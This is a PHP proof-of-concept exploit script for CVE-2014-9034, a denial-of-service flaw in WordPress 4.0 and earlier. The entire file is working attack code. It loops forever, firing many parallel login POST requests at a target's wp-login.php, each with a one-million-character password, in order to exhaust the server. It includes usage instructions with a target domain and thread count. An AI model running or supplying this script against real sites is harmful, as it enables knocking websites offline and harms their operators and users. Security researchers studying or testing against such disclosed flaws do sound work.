<?php

echo "\nCVE-2014-9034 | WordPress <= v4.0 Denial of Service Vulnerability\n";
echo "Proof-of-Concept developed by john@secureli.com (http://secureli.com)\n\n";
echo "usage: php wordpressed.php domain.com username numberOfThreads\n";
echo " e.g.: php wordpressed.php wordpress.org admin 50\n\n";

echo "Sending POST data (username: " . $argv[2] . "; threads: " . $argv[3] . ") to " . $argv[1];

do {
 
$multi = curl_multi_init();
$channels = array();

for ($x = 0; $x < $argv[3]; $x++) {
  $ch = curl_init();

  $postData = array(
    'log' => $argv[2],
    'pwd' => str_repeat("A",1000000),
    'redirect_to' => $argv[1] . "/wp-admin/",
    'reauth' => 1,
    'testcookie' => '1',
    'wp-submit' => "Log%20In");

  $cookieFiles = "cookie.txt";

  curl_setopt_array($ch, array(
      CURLOPT_HEADER => 1,
      CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
      CURLOPT_REFERER => $argv[1] . "/wp-admin/",
      CURLOPT_COOKIEJAR => $cookieFiles,
      CURLOPT_COOKIESESSION => true,
      CURLOPT_URL => $argv[1] . '/wp-login.php',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => $postData,
      CURLOPT_FOLLOWLOCATION => true));
   
    curl_multi_add_handle($multi, $ch);
 
    $channels[$x] = $ch;
}
 
$active = null;

do {
  $mrc = curl_multi_exec($multi, $active);
} while ($mrc == CURLM_CALL_MULTI_PERFORM);
 
while ($active && $mrc == CURLM_OK) {
    do {
        $mrc = curl_multi_exec($multi, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);
}

foreach ($channels as $channel) {
    curl_multi_remove_handle($multi, $channel);
}
 
curl_multi_close($multi);
echo ".";
} while (1==1);

?>
